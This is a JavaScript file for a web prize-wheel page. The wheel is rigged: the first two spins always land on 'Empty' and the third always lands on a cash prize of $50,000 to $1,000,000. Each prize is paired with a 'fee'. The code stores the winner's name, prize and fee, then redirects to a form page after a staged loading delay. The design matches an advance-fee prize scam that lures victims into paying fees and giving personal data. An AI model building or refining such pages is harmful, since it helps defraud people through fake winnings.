const prices = [
    "$50,000.00", "$100,000.00", "$125,000.00", "$150,000.00", "$175,000.00",
    "$200,000.00", "$250,000.00", "$300,000.00", "$450,000.00", "$500,000.00",
    "$600,000.00", "$800,000.00", "$850,000.00", "$900,000.00", "$1,000,000.00", "$ Empty"
];

const fees = {
    "$50,000.00": "$650", "$100,000.00": "$1000", "$125,000.00": "$1250",
    "$150,000.00": "$1500", "$175,000.00": "$1750", "$200,000.00": "$2000",
    "$250,000.00": "$2500", "$300,000.00": "$3000", "$450,000.00": "$4500",
    "$500,000.00": "$5000", "$600,000.00": "$6000", "$800,000.00": "$8000",
    "$850,000.00": "$8500", "$900,000.00": "$9000", "$1,000,000.00": "$10000"
};

// Create wheel segments dynamically
const wheel = document.getElementById("wheel");
const segmentCount = prices.length;

for (let i = 0; i < segmentCount; i++) {
    const segment = document.createElement("div");
    segment.className = "segment";
    segment.style.transform = `rotate(${i * (360 / segmentCount)}deg)`;
    segment.style.background = "transparent"; // No additional shapes

    const label = document.createElement("span");
    label.textContent = prices[i];
    segment.appendChild(label);

    wheel.appendChild(segment);
}

let rollCount = 0;
const rollButton = document.getElementById("roll-button");
const result = document.getElementById("result");
const loading = document.getElementById("loading");

rollButton.addEventListener("click", () => {
    if (rollCount < 3) {
        const isEmpty = rollCount < 2;
        const prize = isEmpty ? "$ Empty" : prices[Math.floor(Math.random() * (prices.length - 1))];
        const segmentIndex = prices.indexOf(prize);
        const randomDegree = segmentIndex * (360 / prices.length) + 360 * 3;
        
        wheel.style.transition = `transform ${rollCount === 2 ? "1s" : "1.5s"} ease-out`;
        wheel.style.transform = `rotate(${randomDegree}deg)`;

        setTimeout(() => {
            result.innerHTML = isEmpty 
                ? `<b>Try again! You chose ${prize}. You still have ${2 - rollCount} left.</b>`
                : `<b>Congratulations! You won ${prize}!</b>`;

            // Add at the end of the third roll logic
if (rollCount === 2) {
    const winnerPrize = prize; // Final prize won
    const fee = fees[winnerPrize] || "N/A"; // Retrieve fee for the prize

    // Simulate capturing full name from the form (temporary default name here)
    const fullName = localStorage.getItem("userFullName") || "Winner";

    // Save the details in localStorage
    localStorage.setItem("winnerName", fullName);
    localStorage.setItem("winnerAmount", winnerPrize);
    localStorage.setItem("winnerFee", fee);

    // Show loading and redirect to form
    setTimeout(() => {
        loading.style.display = "block";
        setTimeout(() => {
            window.location.href = "form.html";
        }, 10000);
    }, 2000);
}
            rollCount++;
        }, 1500);
    }
});
